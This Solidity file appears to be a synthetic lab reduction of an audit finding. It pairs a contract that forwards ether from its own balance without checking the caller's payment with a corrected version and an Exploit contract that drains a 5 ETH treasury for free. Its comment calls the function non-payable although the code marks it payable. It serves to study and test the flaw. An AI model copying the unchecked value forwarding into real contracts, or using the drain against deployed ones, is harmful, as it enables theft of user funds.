// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Switchboard — Unchecked Fund Provision (OtterSec, finding 47981)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    SbFunction.forward calls transaction.to with transaction.value and never
    checks msg.value. The function is not payable, so the caller pays 0.
    A pre-funded balance of 5 ETH is sent to the sink. The corrected forward
    reverts unless msg.value equals the requested value, and a paid call
    leaves the pre-existing treasury in place. Vulnerable call preserved
    verbatim (@> VULN). */

contract SbFunction {
    struct Transaction {
        address to;
        uint256 value;
        bytes data;
        address from;
    }

    uint256 public lastMsgValue;
    uint256 public lastSent;

    // SbFunction.forward — value call quoted by the report.
    function forward(Transaction[] memory transactions, bytes[] memory signatures) external payable {
        signatures;
        for (uint256 i = 0; i < transactions.length; i++) {
            Transaction memory transaction = transactions[i];
            lastMsgValue = msg.value;
            lastSent = transaction.value;
            // @> VULN: the call spends transaction.value from this contract's balance; the caller does not have to pay it
            (bool success, bytes memory returnData) = transaction.to.call{value: transaction.value}(
                abi.encodePacked(transaction.data, transaction.from)
            );
            // FIX: require(msg.value == transaction.value) and forward that payment, or pass value: 0
            returnData;
            require(success, "forward failed");
        }
    }
}

contract SbFunctionFixed {
    struct Transaction {
        address to;
        uint256 value;
        bytes data;
        address from;
    }

    function forward(Transaction[] memory transactions, bytes[] memory signatures) external payable {
        signatures;
        uint256 needed = 0;
        for (uint256 i = 0; i < transactions.length; i++) {
            needed += transactions[i].value;
        }
        require(msg.value == needed, "payment required");
        for (uint256 i = 0; i < transactions.length; i++) {
            Transaction memory transaction = transactions[i];
            (bool success, bytes memory returnData) = transaction.to.call{value: transaction.value}(
                abi.encodePacked(transaction.data, transaction.from)
            );
            returnData;
            require(success, "forward failed");
        }
    }
}

contract Exploit {
    address public constant SINK = 0x0000000000000000000000000000000000000eE1;
    uint256 public constant N = 5 ether;

    SbFunction public sb;
    uint256 public paid;
    uint256 public credited;
    uint256 public treasuryLeft;

    constructor() {
        sb = new SbFunction();
    }

    function run() external {
        uint256 treasury = address(sb).balance;
        require(treasury == N, "treasury was not holding N");
        uint256 sinkBefore = SINK.balance;
        SbFunction.Transaction[] memory txs = new SbFunction.Transaction[](1);
        txs[0] = SbFunction.Transaction({to: SINK, value: N, data: "", from: SINK});
        bytes[] memory signatures = new bytes[](1);
        sb.forward(txs, signatures);
        paid = sb.lastMsgValue();
        credited = SINK.balance - sinkBefore;
        treasuryLeft = address(sb).balance;
        require(paid == 0, "caller paid");
        require(credited == N, "sink was not credited N");
        require(treasuryLeft == 0, "treasury was not drained");
    }
}
